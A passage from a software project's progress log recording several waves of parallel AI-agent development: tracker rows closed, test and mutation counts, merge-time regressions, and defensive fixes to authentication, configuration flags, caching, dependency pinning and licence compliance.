author had just filed, one of which turned out to be a gate. **On the merge it caught two more**,
filed by the CI and deployment agents in worktrees it could not see and therefore adjudicated by
nobody (`B460`) — which is the failure mode a hand-maintained line has, caught by the guard built
for it, on its first run.
**And `B442`'s deploy script refused a deploy on its first real run, correctly.** `shipped bytes
FAIL 96/656 match the committed blob`: `.gitattributes` said `* text=auto`, which converts to the
platform's native ending on checkout, and `docker build` copies the **working tree** rather than
the index — so **every image ever built on the Windows host has contained CRLF Python source**
(`B461`). Sixty of sixty sampled `.py` files differ from their blobs by carriage returns alone.
Nothing broke, because Python tolerates it; the two incidents this repository did catch, `#150`
and `#77`, were shell scripts, where the same bytes are fatal. `B360`, `B362` and `B414` each
fixed the instance they could see and none asked what `text=auto` meant for the other two thousand
files — because on Linux, where all three were measured, it means nothing.

### Twenty rows closed and four left open on purpose, including the one the owner has to answer
`b0ec056..HEAD`. **619 tracked, 390 done. 0 new phase rows, 0 regressions. `B22`, `B23`, `B210`,
`B232`, `B233`, `B260`–`B262`, `B270`, `B271`, `B290`, `B292`, `B300`–`B302`, `B325`, `B348`,
`B335`, `B336`, `B338`, `B339`, `B356`, `B358`, `B361`, `B414`, `B415` and `B420` closed; twenty-nine rows filed, and `B15`/`B16`, `B280`, `B324`, `B291`
and `B349` left open with their measurements rather than ticked on half a fix.** Four worktrees,
one file touched by more than one agent plus three shared test files, all reconciled with both
contributions intact. 396 tests added; 97 mutations run, 96 caught, 1 survived and fixed.
**`B262` was the last live security gap and the fix is not the one it looked like.** With auth on,
`GET /` correctly `302`s to `/login` while **`GET /static/index.html` returned 200 with all
292,260 bytes**. An auth rule on the `/static` mount was the trap: the login page needs its own
CSS, JS and fonts *while unauthenticated*, so gating the mount locks everyone out. The two
documents are **templates a route already serves**, so the mount now redirects three
route-owned filenames to their routes and touches nothing else — `302` because the file is on
disk and a `404` would be a lie, and one table read by both the mount and the three handlers so a
page cannot get a route without the mount learning it (`Law 13`). `B120`'s reason survives
exactly: the two `*-variants.html` sandboxes still reach the network. Two corrections came from
measurement rather than reasoning — Starlette rewrites `root_path` inside a `Mount`, so the first
version sent `/static/index.html` to `/static/`; and the match is casefolded, because a
case-insensitive filesystem serves `INDEX.HTML` out of `index.html` and that is two of the three
platforms this project ships installers for.
**`B210`'s claim was being *served*, which is why correcting the file was not enough.** FastAPI
publishes a route docstring as its `description` in `/openapi.json`, so `serve_backgrounds`'s
"Sandbox page for prototyping background effects" was rendered in `/docs` **and read by the
agent's own endpoint-discovery tool**. A false claim about a page that has never existed was
reaching the model as fact.
**`B290` is the row that did not move a single number, and that is the finding.** The naive
comment blanker was re-measured at **7,277 lines of live code in 15 modules** — the row's "77
modules" does not reproduce under any definition counting live code — and it runs the other way
too: **274 lines of `static/index.html` comment are left standing and read as code**. Twenty-two
test files now share `check-specifiers.py`'s stripper, which grew regex literals, CSS (`//` is not
a comment), and HTML where quotes bind only inside a tag. **No asserted count moved: 527 before,
527 after.** So none of the twenty had a defect hiding in those 6,642 lines today — and none of
them could have known that, which is the whole argument for the conversion. A new naive copy now
fails a test that walks every tracked file with `ast` rather than grep, because several of them
describe the defect in prose.
**The theme rows were unparked and the answer is a split, deliberately.** On the **twelve dark
palettes nothing changed colour at all**, asserted token by token; every change lands on the four
light palettes where a value tuned for a dark panel was being painted on a white one. `B22` is
closed by scoping fifteen of nineteen semantic tokens with `light-dark()`, the dark arm being the
original literal. `B23`'s census found **seven** link idioms, not two. But **`B15` stays open and
is not ticked**: `cute` measures **3.44** and `retrowave` **4.15** against their own panels, both
under AA on both surfaces, and *every* fix substitutes a hex a person chose. The measurement is
executable and ratcheted now; the repaint is filed as `B390` with exact values for the owner.
`B16`'s headline was confirmed **false** and pinned as false. Two unnamed defects turned up in the
same pass, both the same shape — a hover that made something *less* visible on a light palette.
**Four rows were left open with a measurement instead of a tick, and one needs the owner.**
`B280`: the declared-charset lever landed and an 891-row sweep across 17 encodings gave **22
corrections and 0 regressions**, but 34 bytes of Big5 is still `johab` and the three rules that
would fix it each cost ~98 correct answers to buy ~16. `B324`: the stated blocker turned out to be
wrong — `uv pip compile --universal` does resolve markers symbolically — but the lock cannot be
*installed* on 3.14 on either architecture here, so it is unverifiable, and an unverifiable lock
is worse than none. **The vendored pass found React shipping with no licence notice anywhere in the repository.**
`check-licences.py`'s rule 7 derives a bundle's contents from `node_modules/` paths and returned
**zero packages from 1.5 MB of Swagger UI** — which carries React, `immutable`, `classnames`,
`fast-json-patch`, `buffer` and more, plus `lodash-es` and `cytoscape` inside Mermaid. **Sixteen
packages, twelve licence texts that did not exist.** For an AGPL project about to be made public
that is the compliance defect, not a tidiness one, and it is `P0-21b` recurring in the bundle
nobody read. Rule 8 now makes every vendored script **declare how its contents are known** —
`derived`, `esbuild`, `sidecar`, `single` or `build`, with no default — so a bundle whose contents
cannot be derived fails rather than reporting nothing. `B336` decided **not** to rebuild the
html2pdf bundle: 27 advisories remain in bytes we serve, **none reachable** (measured per
advisory), and rebuilding trades the one property that makes these hashes checkable by a stranger
— byte-identity with a published artifact — for advisories that cannot fire. The excuses are
recorded as literal witnesses read out of the shipped bytes, so a replacement bundle fails the
gate until somebody re-measures all 27.
**`B290`'s guard caught a new naive blanker written the same day by a different agent** — two
agents in parallel, one eliminating the defect class across twenty-two files, the other
reintroducing it in a twenty-third, and only the integration run noticed (`B415`). The site it
caught turned out to be the one **legitimate** use: `check-licences.py` reads `/*! … */` blocks
*as the answer*, not to reach the code around them, so blanking would delete the input. The check
asks whether a hand-written comment regex exists and is right that one does; what it cannot see
from a regex literal is which direction it runs. Exempted with the reason and the residual risk
written down, and the exemption is held to the same rule as the conversion list — it names a real
site or the test fails.
`B349` needs a human: `2026-08-20` is the fork commit's date upstream and
`2026-08-24` is the clone date, and which one the AGPL §5(a) notice should carry is not ours to
decide.

### Going public: the dependencies nobody was watching, and a README that printed 2 where the checker printed 120
`394e619..HEAD`. **588 tracked, 363 done. 0 new phase rows, 0 regressions. `B320`–`B323`,
`B330`–`B334`, `B337`, `B340`–`B347`, `B350`–`B355`, `B360` and `B362` closed; twelve rows
filed.** Four
worktrees. **`B330`'s new checker found three corrupt files on its first integration run** —
working copies disagreeing with their own git blobs by up to twenty thousand bytes, which
`git diff` and `git status` both reported as clean, because `.gitattributes` silences whitespace
on exactly those files for exactly the right reason (`B360`). Nothing shipped; the committed
bytes were never affected. It was written to stop *version* drift in prose and caught *byte*
drift in the tree. Running that same sweep on the **Windows deployment host** rather than only in
the Linux container then found `B362`, which is the larger half: `core.autocrlf=true` plus a
`.gitattributes` line that said `-whitespace` and not `-text` meant git rewrote LF to CRLF on
checkout for **twelve** of the thirty-eight vendored files — and that working tree is the Docker
build context, so the image has been built from bytes the repository does not contain. Nothing
broke, because JavaScript tolerates CRLF, which is why it survived. `check-vendored-versions.py`
would have failed on that host and passed on Linux for the same commit. The owner asked two questions — *are we current on dependencies* and *is the public
markdown ready* — and the honest answer to the first was **no, and nothing was watching**.
**The pip half of `dependabot.yml` had been configured, reviewed and merged, and could not have
opened a single pull request.** `requirements.txt` carried 31 dependencies and **zero `==`**, and
a bare `fastapi` is a constraint that is always satisfied, so there was never anything to bump.
The config looked like coverage for weeks. All 37 direct dependencies are pinned now, with
`.pantheon/check-pins.py` keeping it that way — and `python-magic==0.4.27`, which had been pinned
*inline in the `Dockerfile`* where neither Dependabot nor the audit could see it, moved into a
`requirements-image.txt` the Dockerfile installs with `-r` (`B321`).
**The one vulnerable package in the image was invisible to the scanner that was supposed to see
it, twice over.** `basicsr` 1.4.2 (`CVE-2024-27763`) is in **neither** requirements file — it
enters through `docker/build-realesrgan-wheels.sh` and a `--no-deps` install, so `pip-audit -r`
never looked at it; and `container-trivy.yml`, which did see it, carried `ignore-unfixed: true`
and had been silently dropping it since the job was written (`B323`). There is **no fix and there
can be none**: 1.4.2 is the newest release, the project has been dormant since 2022, and
`realesrgan>=1.4.2` cannot resolve to anything unflagged. It is an accepted risk now — written
down as `D-2026-09-16-01` with the reachability argument, the conditions that would change the
answer, and a review date that **fails the gate when it passes**, rather than an unexplained
suppression, which is the defect class this tracker keeps finding.
**Three agents corrected the brief they were given, which is the behaviour worth keeping.** The
`CVE-2025-11849` in `mammoth` 1.8.0 that the research pass called the one reachable vulnerability
**does not reach the browser build** — `package.json` maps the vulnerable module to a browser
variant that rejects external files, byte-identical across both versions. The bump landed anyway,
on better evidence: 1.8.0 threw an *unhandled* `TypeError` on a `.docx` with `mc:AlternateContent`
and no fallback, killing the import outright, and silently dropped Word form checkboxes.
`html2pdf.js` 0.14.0 was expected to carry jsPDF 4.2.1; it carries **4.0.0**, nine advisories
short, so `B334` ticks saying so and `B336` costs the three ways out rather than implying a clean
bundle. And `CYBERTOOTH_CHANGES.md`, which the brief called an orphan safe to fold away, is
referenced **twice** by `scripts/pantheon-init.sh` — once in the never-sweep pathspec beside
`LICENSE` and `NOTICE`. It was kept and corrected instead of deleted.
**The going-public findings are worse than the dependency ones.** The README's `How we work`
section — whose entire argument is *our numbers are checkable* — claimed the unreachable-element
count "is now 2" while `check-wiring.py` prints **`UNRESOLVED 120`** and CI runs `--max 120`, with
the command one line away in the same paragraph. Not a regression: the checker was widened three
times and closing the third alone moved it 9 → 124 with no product code changing. The
`pull_request_template.md` and `ISSUE_TEMPLATE/bug_report.yml` both directed contributors to a
**`dev` branch that has never existed here**, and the bug form made it `required: true` — the one
box a reporter could not file without ticking was one they could not truthfully tick.
`THREAT_MODEL.md` carried **four claims that were already false**, including a CSP description
naming a CDN allowance removed on 2026-09-01, and an SSRF listed as live that
`validate_public_http_url` had closed. It also cited `#1058` and `#1039` — **upstream Odysseus
issue numbers, which on a public repository link into this one.**
`SECURITY.md` told vulnerability reporters to *"open a minimal issue"*, which for software
shipping a shell tool, file read/write and email send/read is asking them to disclose publicly;
it names a private channel and a response expectation now. `CODE_OF_CONDUCT.md` did not exist.

### The comment blanker that erased 7,203 lines of live code, and a row that closed on a false Verify
`fdf0e31..HEAD`. **550 tracked, 337 done. 0 new phase rows, 0 regressions. `B160`, `B201`, `B202`,
`B211`, `B212`, `B221`, `B230`, `B231`, `B240`, `B241` and `B310` closed; thirteen rows filed, and
`B232` and `B233` were left open with their measurements written down rather than closed on half a
fix.** Five worktrees; one file touched by more than one agent, against 69 that were not and were
verified byte-identical to the worktree that wrote them. 160 tests added; 91 mutations run, 89
caught, 2 survived and both are written into `B221` as equivalent mutants rather than hidden.
**The integration run found two tests that fail on correct work (`B310`), and one of them is `B87`
for the third time** — a comment quoting the phantom import `B231` had just removed, read as an
import by a scan that reads text rather than code. The other is sharper: `B241`'s own test pinned
three assertions to *now* — two counts and a `heads[0]` lookup — so the checker built to catch the
tracker's prose drifting from its ticks had a test that drifted from the tracker within hours.
**`B290` is the finding of the wave and it indicts our own tooling.** `B83`'s comment blanker —
copied into roughly twenty test files — is `re.sub(r"/\*.*?\*/", "", flags=re.S)`, which cannot tell
a comment from a string. `input.accept = 'image/*,video/*'` at `gallery.js:1202` **opens a comment
the next `*/` closes**, and across `static/js/**` that erases **7,203 lines of live code in 77
modules**. Nine chevrons hid in there, and so did a play triangle at `document.js:4986` and two stop
squares at `notes.js:4517`/`:4586` — which means **`B83`'s own `Verify` was false on the day it was
ticked**. `Law 20` says a test that greps a file is testing the file; this is the sharper version:
a test that greps a file badly is testing a file that does not exist. The correction is recorded in
`B230`'s body rather than by editing `B83`'s closed row, because a record of what was claimed at the
time is worth more than a quietly corrected one (`B44`).
**`B230` is what `Law 13` costs when you let it run.** The chevron was filed at 45 sites in four
spellings; re-measured with a shape detector rather than a spelling list, and with the blanker
fixed, it is **57 sites in five spellings across 23 modules**. The four spellings are provably one
glyph — 180° and −90° reproduce two exactly, +90° reproduces the third reversed, which is the same
stroke because all 57 sites use `stroke-linecap="round"` — so one literal plus a `direction`
argument. The `Law 1` hazard was real and was measured rather than argued: **14 CSS rules and 6 JS
handlers already rotate a chevron, all written against a DOWN base**, so a table that changed the
base orientation would have shifted every one of them silently. Direction lives in the points, never
in a transform, and a fixture holds what each of the 57 literals emitted before the change.
**`B212` was decided by finding out what the product actually uses.** `openapi_url=None` looked like
the tidy answer until `src/tools/system.py:687` turned up fetching `/openapi.json` over the loopback
to build the agent's own endpoint list — switching the docs off would have deleted a shipped tool
(`Law 1`), so that was not a judgement call. `/docs` is vendored from `static/lib/swagger-ui` with
its bootstrap hashed the `B141` way, verified against two origins with one hash set. `/redoc` is
**refused and filed**: it needs `new Worker(URL.createObjectURL(…))` and an `eval` path, and the CSP
does not widen for a convenience. The row's real product, though, is the test — the CDN scan read
`static/**` and now asks the **running app** for every parameter-free page, which is how `B211`'s
count came back four short: `/static/index.html` and `/static/login.html` were shipping refused
inline blocks too.
**Two rows were left open on purpose and that is the wave's other result.** `B232` could not be done
without four files on another agent's list, so its agent measured instead: **10 ingestible extensions
are not offered and 9 offered extensions no register names** — and wrote down that the obvious fix is
a trap, because `INGESTIBLE_EXTS` includes `.pdf` and `.xlsx` and the composer path reads the raw
file as text. `B233` needs a route beside `POST /api/documents/import-pdf` and a branch in
`documentLibrary.js`, neither of them its agent's, and half of it would be a route nothing calls.
An honest open row with a measurement beats a tick.

### The wave with no collisions, a 500 nobody was serving, and the nonce that was costing 283 KB a navigation
`909811f..HEAD`. **537 tracked, 326 done. 0 new phase rows, 1 caught at the merge. `B02`, `B03`,
`B04`, `B73`, `B83`, `B121`, `B140`, `B141`, `B151`–`B153`, `B161`–`B163`, `B170`, `B171`, `B180`,
`B200`, `B220` and `B250` closed; fifteen rows filed.** Five worktrees again, and this time
**exactly one file was touched by more than one agent** — `ROADMAP.md` — against 72 that were not,
all 72 verified byte-identical to the worktree that wrote them. 218 tests added; 122 mutations run,
122 caught, 0 survived. The integration run again found the one thing no agent could (`B250`): the
`B83` icon table reached `markdown.js`, and a relative specifier cannot resolve from the `data:` URL
two separate Node loaders use to evaluate it — the agent fixed six such sandboxes and missed the
seventh, whose own header says it *mirrors* one of the six. `Law 13` in the tests rather than the
product, and the suite is the only place it is visible.
**`B141` is the row of the wave and it started as a caching complaint.** `/` carried no `ETag`, no
`Last-Modified` and no `Cache-Control` **at all** — 292,547 bytes on every install generation and,
because the worker's stale-while-revalidate branch refetches the shell in the background, the same
283 KB on **every open by every client**. The cause was 7 `{{CSP_NONCE}}` placeholders: a body built
per request cannot carry a validator derived from a file. Externalising the inline blocks was
measured and **rejected on evidence, not size** — three of the seven run before any module does (the
`<head>` theme bootstrap writing the palette onto `documentElement.style`, the per-route favicon and
PWA-manifest builder `B120` depends on, and the loading overlay) and a `<script src>` is a
parser-blocking round trip, so externalising buys a validator and pays a flash of the wrong theme on
every cold open. The blocks are authorised by `'sha256-…'` derived from the served file instead, and
**this is a narrowing, not a widening**: a nonce authorises whatever bytes sit inside a tag carrying
it, a hash authorises those bytes only, and the nonce stops going out on every JSON and static
response. `/` now answers `304` with 0 bytes. The parser detail is worth keeping: the file is read
with `html.parser`, not a regex, because `index.html:313` has a `<script` inside an HTML comment and
a regex counts eight where the browser executes seven.
**Three rows were closed by re-measuring and finding the filed number wrong, every time in the
direction of more work.** `B83` said five hand-written play triangles in two geometries; there were
**19 in five**, the fifth found by a shape detector rather than a spelling list, and the fix moved
both the play and stop families — 32 literals across 17 modules — into one `icons.js`. `B161` said
three client copies of the language map; there were **four**, the uncounted one being `_attachLang`
in the same file as a counted one. `B162` said the RAG indexers read the old registers; they did, and
a **fourth** site nobody had named — `POST /api/personal/upload` — was reading `.docx` bytes as
UTF-8 with `errors="replace"`, indexing a 40-paragraph document as three chunks that were 30 %
U+FFFD.
**And two rows were already done.** `B02` and `B03` were implemented in full by commit `1a70478`,
whose own Progress entry says it closed them, while both checkboxes stayed `- [ ]` — the tracker's
narrative and the tracker's count disagreeing about the same six rows in the same sentence. They were
re-measured rather than ticked on the claim (`Law 9` cuts both ways: an unverified *done* is as
dishonest as an unverified *fixed*), and the mechanism is filed as `B241`. The same re-measurement
habit paid twice more: `B140`'s "unauthenticated route" was the *handler* — `AuthMiddleware` gates
`/backgrounds` like any other page — and `B163`'s proposed `is_image_file` gate would have taken
`.bmp`, `.tiff`, `.avif` and `.heic` down with the SVG, four working formats lost to fix one.
**`B220` is why the last suite took sixteen minutes.** `check-env-declared.py` ran 43.5–46.2 s per
invocation and two test files spent **499 s** calling it; `rival_vocabularies` alone was 27.4 s
because two module-level computations sat inside a per-function loop. Four caches and one hoist,
**nothing narrowed** — proved by byte-identical `--list` output — took it to 14.8 s, and those two
files to 89 s with 56 more tests in them.

### Five agents, nineteen rows, and two switches that meant the opposite of what an operator typed
`c4af3a4..HEAD`. **522 tracked, 306 done. 0 new phase rows, 1 regression caught at the merge.
`B75`, `B80`, `B81`, `B82`, `B95`–`B98`, `B100`–`B103`, `B110`–`B113`, `B120`, `B122`, `B150` and
`B190` closed; fourteen rows filed.** Five worktrees, five surfaces, **no file touched by two agents
without both edits surviving and no row number collided** — the second clean merge running, and both
are the row-range spacing rather than luck. 218 tests added; 159 mutations run, 159 caught, 0
survived.
**The integration run earned its eleven minutes and that is `B190`.** Every agent left its own
surface green; the merged tree failed four tests, and two of them were a real regression that
`B97`'s own converted files were *structurally* unable to see — the unification carried in
`if not isinstance(raw, str): return bool(raw)`, and the two callers living on the tri-state's third
answer each needed a value those files never pass. `_parse_supports_tools({})` went from `None` to
`False`, which is the "quietly take native tools away from an endpoint that had them" its own
`P3-22` docstring exists to prevent; `read_email_by_uid` read a truthy `Query(False)` as yes and
fetched whole message bodies where it had fetched truncated ones. The third failure was a test
asserting the defect `B96` had just fixed, and the fourth was markup — whose fix was to delete an
unread `id` rather than grow the list that records unread ids, because growing it records a defect
instead of fixing one.
**`B96` is the security row of the wave and it is an operator's own words being ignored.**
`AUTH_ENABLED=0` left auth **enabled** and `PANTHEON_SINGLE_USER=false` left single-user **on** — a
host that had written down "off" got "on", silently, and the two `# env-spelling:` exemptions in the
checker are what let it stay that way. Both read `env_flags.env_flag` now, both default `True` so an
unset variable keeps the safe answer, and both log once when they see a spelling the old rule read
backwards. This is a behaviour change on any host that set either, so it ships with a release note in
`.env.example` and a *Changed — read this before upgrading* block in `CHANGELOG.md` rather than
quietly. `B150`, found underneath it, is worse in shape if not in reach: `_SINGLE_USER_MODE` was
computed at import into a constant **referenced nowhere in the tree**, so no spelling turned
single-user off, including the documented one — invisible to all four of `check-env-declared.py`'s
rules, which is why the fifth rule (`INERT`) now exists.
**`B120` is the row a redeploy would have found eventually and a user would have found first.**
`static/sw.js` answered a navigation only for `/`, so eight routes that serve the byte-identical
cached shell reached the network instead — and `static/index.html` builds a per-route manifest with
`start_url: path`, so *Add to Home Screen* from `/tasks` installed an app whose launch URL failed
offline. The route set is **checked, not copied**: a test boots the real app, asks every
parameter-free GET route for its body, normalises the per-request nonce out, and requires the set
answering byte-identically to `/` to be exactly `SHELL_ROUTES` — so the next route added to `app.py`
fails the test rather than joining the eight (`Law 13`). `B121` beside it is **left open on purpose**:
the row said check first whether a nonce can be served with an `ETag` at all, and it cannot —
`SecurityHeadersMiddleware` mints a fresh nonce per request, so a `304` would update the stored
headers and leave cached HTML holding nonce A under a policy naming nonce B, blocking all seven
inline scripts. The measurement is written into the row and `B141` is the bigger fix it waits on.
**Two rows were closed by discovering the filed premise was wrong, which is the point of measuring
first.** `B122` assumed `AuthMiddleware` made an offline login pointless; the reachable path is Log
out, which clears local state inside a `try {} catch {}` and then navigates to a `/login` that was
`NOT HANDLED`. `B103` assumed `.svg` had no preview and that PIL could rasterise one; neither was
true, and the real defect was hostile markup served by an exception handler with none of the
hardening the emoji route already applied to the product's own SVGs. `B101` went the same way one
level deeper: the `charset_normalizer` fallback was not merely unreached but **unreachable**, because
the reader it was meant to rescue opens with `errors="ignore"` and cannot raise — so a Polish cp1250
file passed every gate with each accented character silently deleted.

### The deploy that found the outage: two MCP servers had not started since `B74`
`dad47cb..HEAD`. **508 tracked, 286 done. 0 new phase rows, 1 regression closed. `B131` closed;
1 row filed.** A rebuild-and-redeploy asked for as a routine checkpoint, which is how it was found.
The image built and came up clean, and every check that was supposed to pass did: `precacheShellGraph`,
`env_backed_flag`, `looks_like_text` and `mcp_tool_schema` all present in the running image, `B67`'s
`servers: ['email', 'image_gen', 'rag']` confirmed live, `B90`'s three keys shipping `None` with every
effective value `False`. **Then the startup log had two tracebacks in it.**
**`B74` took the RAG and Email servers offline on the day it landed and nothing noticed for a week.**
`src/tool_schemas.py` imports `src.agent_tools` at its top and `src/agent_tools/__init__.py` imports
`FUNCTION_TOOL_SCHEMAS` back out of it — a cycle that resolves only if `agent_tools` is imported first.
`B74` gave three servers `from src.tool_schemas import mcp_tool_schema` as their **first** `src` import,
and two of them died on `ImportError: cannot import name 'FUNCTION_TOOL_SCHEMAS' from partially
initialized module`. Eleven email tools and the whole RAG surface, gone.
**Nothing in-process could see it, and that is the real finding.** Every test and
`check-mcp-schemas.py` run where `src.agent_tools` is already imported — `tests/conftest.py`
pre-imports it, which is `B18`'s own fix masking this one. 9,580 passing tests said the tree was fine.
Only a fresh interpreter importing the server the way `builtin_mcp.py` spawns it shows the failure, so
that is the test: `tests/test_a_server_starts_in_its_own_process.py` imports each of the four servers
in a subprocess and drives `list_tools()` in another. Nine tests, and they fail on the tree as it stood
an hour ago. The fix is an import-order guard in the three servers, not a rewrite of the cycle —
`tool_schemas` annotates a module-level function with `Optional[ToolBlock]` and a second cycle runs
through `src.tool_parsing` behind it. Both attempts to unpick it are reverted and filed; a live outage
does not wait for the tidier fix.

### A Law 16 gate an env var could force open, and a tool that nearly wrote into another agent's tree
`1d1975a..HEAD`. **507 tracked, 285 done. 0 new phase rows, 0 regressions. `B76`, `B77`, `B78`,
`B84`, `B85`, `B86`, `B90` and `B91` closed; fifteen rows filed.** Four agents, four worktrees. **No
file was touched by two agents and no row number collided** — the first clean merge of the five, and
both are consequences of spacing the number ranges and splitting the surfaces deliberately rather
than of luck.
**`B90` is a security defect on two of its three keys, and it ships.** `allow_model_download` and
`searxng_widen_engines` are both `Law 16` gates on outbound traffic — model bytes from HuggingFace,
and the user's query text handed to a search provider — and an env var forced them **on** against a
stored `False`. Not hypothetical: **every `docker-compose*.yml` forwards all three as
`${VAR:-0}`**. The third, `metrics_enabled`, is the annoyance of the set: the endpoint still demands
admin, so what was lost is the ability to reduce attack surface rather than data. The fix is a
storage shape (`D-2026-09-15-01`) — the three keys ship `None` rather than `False`, so a stored
choice is distinguishable from an absence, and `bool(None)` is `False` so no reader moves.
**`B91`'s premise was wrong in a load-bearing way.** *"50 sites, seven rules"* is an aggregate over
**four trust boundaries** — 17 read the environment, the rest parse HTTP form fields, model tool
arguments and skill frontmatter. Unifying all fifty would have been `Law 14`, and the row's own
evidence carried the error: it named two helpers as disagreeing about the same question when the
second parses a request body. The environment half is 38 sites and **ten** rules, not 34 and seven.
**And two disagreements it never found are worse than any it named**: `AUTH_ENABLED=0` leaves auth
**enabled**, and `PANTHEON_SINGLE_USER=false` leaves single-user **on**. Both are held rather than
silently corrected, with a row of their own, because changing them changes what a live deployment
means.
**`B76` asked for a gate that already existed.** `_looks_like_text` shipped in `B02` as a *closure
nested inside a route* — 8 KiB probe, NUL check, replacement-character ratio, thresholds already
measured across seven languages. Pantheon had already decided a `.toml` attachment is text; it
decided it for the mailbox and not for the composer. The fix is a move, not a build, and the
registers were deliberately **not** extended: they answer *which extractor*, the bytes answer
*whether to read*. A file that works today pays zero extra reads, pinned by a test that counts
probe reads on a 5 MB `.md` and gets none.
**`B77`'s suggested key does not fix its own headline example** — hash plus extension collapses
`LICENSE` against `COPYING`, both extensionless. And the same agent found that `_process_text_file`
had been telling the model **the upload id as the filename** on every text attachment ever sent.
**`B78`'s own measurement committed `Law 20`**: its count of eight `.task-log-status-*` CSS rules
included a *sentence about* the selector in a comment. Seven. Two of its three named consumers were
half false — the notification client can say the wrong thing but has never been reached, and
`_isFinishedRun`'s defect was **its name, not its filter**. `B84` folded into it; `B13`'s closure
annotation named `B82` twice for a row that had been renumbered `B84` on merge, and that is
corrected.
**`B85`'s menu had a third item.** The row weighed `reload` against `default` and concluded `/` and
the fonts must keep the expensive one. `{cache: 'no-cache'}` is *always revalidate* — the `reload`
guarantee at 304 prices, for all 213 entries including the ones the response header never reaches.
Measured: **9.90 MB → 283.7 KB** on an unchanged bump, 212 of 213 answering with an empty 304.
**`B86`'s list of seven was short by five**, and the five matter more: three `@font-face` rules for
**Inter, the UI font**, live in an inline `<style>` in `index.html` — neither a linked stylesheet nor
`style.css`, so nothing that reads either could see them. Install follows `url()` out of the CSS it
is already fetching now, the same move `B57` made for imports. The validation that makes it
trustworthy: `katex.min.css` names sixty `url()`s, and following only the format a browser requests
**reproduces the hand-kept twenty exactly**.
**And the merge found `B18`'s class twice more** (`B130`). A new fixture reloaded `src.constants` — which 41 modules import from **by value** — and five tests in two other files began monkeypatching objects nobody reads. The teardown could not have saved it: reloading a second time produces a *third* set of objects, not the originals. **A pre-existing instance came with it**: `test_llm_core_connect_timeout` has reloaded `src.llm_core` since before this fork, and CI has never seen it because the victim file sorts alphabetically first — the same accident that hid `B18` for weeks.
**One tooling defect worth recording**: `/tmp/mutlib.py` hardcodes its root as `/work/pantheon`, so
an agent running mutations in its own worktree would have **written into the integration tree**.
One agent noticed and used a scoped copy. Across the four: 117 mutations, 116 caught, one verified
equivalent — and seven survived a first pass, every one fixed by strengthening the test.

### Seven rows in parallel, and a mailbox that was opening a plaintext socket
`1a70478..HEAD`. **491 tracked, 276 done. 0 new phase rows, 0 regressions. `B08`, `B11`, `B12`,
`B13`, `B14`, `B20`, `B57` and `B87` closed; ten rows filed.** Four agents, four worktrees, four patches
merged here. Three files were edited by two agents each (`chat.js`, `style.css`, `sw.js`) and the
three-way merge held; 269 tests across every file they touched pass on the merged tree. Two agents
again claimed the same row numbers, and `B48` is why four were renumbered on merge. **The merge itself found a defect**: the specifier checker read raw text, so a docstring explaining why a module is loaded as `import('./tasks.js?v=…')` failed the gate with a literal ellipsis reported as a forked query string (`B87`). `Law 20` in the checker, one day after `B58` widened it — and the second time in three days this law bit from that exact direction.
**`B20` found one defect, not the class the row implied, and the interesting part is why.** For a
**falsy** shipped default the `or`-chain and `setting_is_explicit` are behaviourally identical in
every state — a merged-in `""` reads the same as an absence. Twelve of the thirteen pairs ship
falsy; the thirteenth was `task_concurrency_cap`, and `H06` already fixed it. The row's *"ten more
in `email_helpers`"* was a misreading: `H07` found ten and fixed ten. **The eleventh is the one that
mattered** — `imap_starttls` answered `False` in the MCP server and `True` in `email_helpers`, so
`IMAP_STARTTLS=false` opened a **plaintext IMAP socket** and called `starttls()` on a server the
operator had just said does not offer it. One variable, one host, two answers. The row also asked
for the wrong tool: `setting_is_explicit` cannot help a flat key `DEFAULT_SETTINGS` does not ship.
And the checker went **inside** `check-env-declared.py` rather than becoming a nineteenth file, so
no published figure moved.
**`B57`'s severity was understated, not overstated.** 21 of the 32 shell roots have an unprecached
static import, and an ES module graph loads whole or not at all — so offline from a cold install the
shell paints and **nothing runs**. Two events open that window and neither is rare: the worker
registers from the bottom of the document, so a cold install caches the lists and nothing else; and
`activate` deletes every other cache, so a `CACHE_NAME` bump discards the whole opportunistic
population — 415 bumps to date, 13 in the last week. Install now walks the graph it is already
fetching, 105 → 173 modules. `D-2026-09-14-04` records why the opportunistic path is a freshness
path and not a completeness one.
**`B08`'s CSS half was true and its stated consequence was wrong**: the missing rules cost a *live*
run nothing, because an inline `opacity` forces it visible. What they cost was the stale case — of
four agent states, the one needing action was the only invisible one. **`B14` was wrong in the other
direction too**: an auto-escalated turn *is* steerable while the composer still reads `chat`, so
`P6-18` was also withholding a working bar, and the key binding was being taken and refused
regardless.
**Two defects existed only on the merged tree, and neither agent could have seen its own.** The
specifier checker read raw text, so a docstring explaining why a module is loaded as
`import('./tasks.js?v=…')` failed the gate with a literal ellipsis reported as a forked query
string (`B87`) — `Law 20` in the checker, one day after `B58` widened it, and the second time in
three days this law bit from that exact direction. And `B07`'s Activity-row harness threw
`ReferenceError` because `B11`'s work gave the renderer it extracts a call to `runStaleLabel`,
which was in no stub list. **The harness evaluates the real word table now rather than gaining a
stub** — a stub would have fixed the symptom and left the test asserting a word the test file made
up. Both are the cost of parallelism, and both were cheap because the merge runs the whole suite.
**`B12` folded into `B11`**, and the reason is the good kind: the sharing `B12` asks for had
*already* been applied to the icon and title, and that is what erased the tell `B11` wants. Settled
apart, one undoes the other. The measurable defect was not a missing badge — the todo card's
`aria-label` said *"Agent task list"* while its visible title said *"Task list"*. **The screen
reader was told which list it was; the eye was not.** `B13` was checked against `B78` and does not
fold: one is the six *values*, the other is three spellings of the *words*.
Across the four: 102 mutations run, 102 caught, and **twelve survived a first pass** — every one
fixed by strengthening the test. The most valuable was a control mutation on `H07`'s own ground: a
test that blanked eight keys and asserted four, so restoring the exact credential-loss defect it
exists to prevent survived the whole file.

### The tally was answering a narrower question than its heading, and four rows landed in parallel
`2f9c0ad..HEAD`. **481 tracked, 268 done. 0 new phase rows, 0 regressions. `B02`, `B03`, `B05`,
`B07`, `B21` and `B79` closed; `B75`, `B76`, `B77` and `B78` filed.**
**The figure jumped 382→481 and 190→268 because `B79` fixed the count, not because 78 rows landed
today.** The owner closed eleven backlog rows across three pushes, watched the headline sit still,
and asked why. It could not move: the table counted phase rows plus `Setup`, and every `B` and `H`
row sat outside it — 461 rows in the file, 258 done, against a headline reading 382/190. **A
checker cannot find a defect in the question it was given**; `check-tracker.py` had been validating
that table perfectly against the rows it was told to count. A `Backlog` row now sits in the table,
recounted from the ticks and folded into the Total the way `Setup` already was, and the checker
recomputes it — verified by moving one tick and watching it name both lines. Older entries keep
the figures they were written with.
**Four rows were implemented in parallel, each in its own git worktree, each returning a patch.**
